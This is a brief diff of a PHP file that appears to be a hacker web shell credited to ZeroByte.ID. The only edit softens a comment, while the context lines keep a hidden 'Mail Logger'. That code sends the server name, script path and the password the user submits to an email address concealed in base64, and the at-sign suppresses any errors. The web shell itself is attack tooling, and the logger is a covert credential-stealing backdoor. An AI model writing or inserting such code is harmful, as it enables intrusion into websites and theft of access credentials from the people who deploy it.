@@ -80,6 +80,6 @@ echo'<br><center>&copy; 2017 - <a href="http://zerobyte.id/">ZeroByte.ID</a> Rec
 
 
 
-//Mail Logger wkwkwk nakal kamu ya nge log orang
+//Mail Logger 
 // "m9zY29kZTc3N0BnbWFpbC5jb20=" >>> voscode777@gmail.com
 $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail(base64_decode("dm9zY29kZTc3N0BnbWFpbC5jb20="), 'root', $tmp); // Edit or delete!?>
